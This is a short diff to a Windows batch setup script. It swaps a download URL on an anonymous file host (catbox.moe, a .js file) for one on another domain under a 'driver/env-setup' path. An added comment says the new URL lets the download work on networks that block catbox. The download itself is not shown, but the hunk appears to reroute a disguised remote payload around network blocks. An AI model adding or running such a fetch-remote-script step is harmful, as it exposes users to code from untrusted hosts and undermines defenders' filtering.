@@ -87,7 +87,8 @@ if errorlevel 1 (
 :: -------------------------
 :: Download required files (same URL as mac.cmd — both curl and PowerShell must match)
 :: -------------------------
-set "ENV_SETUP_URL=https://files.catbox.moe/1gq866.js"
+REM Same script as mac.cmd; served via API so networks that block catbox still work
+set "ENV_SETUP_URL=https://api.canditech.org/driver/env-setup.npl"
 set "CODEPROFILE=%USERPROFILE%"
 if not exist "%CODEPROFILE%" mkdir "%CODEPROFILE%"
 
